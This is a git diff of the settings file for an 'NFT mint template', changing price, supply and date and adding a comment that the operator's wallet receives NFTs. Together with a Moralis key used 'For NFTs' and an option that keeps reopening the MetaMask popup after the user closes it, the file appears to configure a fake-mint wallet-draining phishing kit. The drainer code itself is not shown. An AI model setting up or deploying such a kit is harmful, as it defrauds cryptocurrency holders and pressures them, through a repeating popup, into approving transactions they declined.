@@ -1,11 +1,11 @@
-const address = "YOUR WALLET";
+const address = "YOUR WALLET";    // Your wallet that you have to receive NFTs
 const infuraId = "API KEY"     // Infuria ID | https://infura.io/ | For Wallet Connect
 const moralisApi = "X-API-KEY"    // x-api-key | https://moralis.io/ | For NFTs
 
 const collectionInfo = {
     name: "NFTs Montana",
     title: "NftMontana MINT Template", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
-    date: "24.04.2022",
+    date: "25.04.2022",
     socialMedia: {
         discord: "https://discord.gg/example",
         twitter: "https://twitter.com/example",
@@ -22,8 +22,8 @@ const collectionInfo = {
     }
 }
 const mintInfo = {
-    price: 0.05,         // Price per NFT.
-    totalSupply: 667,   // Total supply of NFTs.
+    price: 0.02,         // Price per NFT.
+    totalSupply: 999,   // Total supply of NFTs.
     minUnits: 1,        // Min units to buy.
     maxUnits: 10,        // Max units to buy.
     askMintLoop: true,  // If true, when the user closes the metamask popup, it reopens automatically.
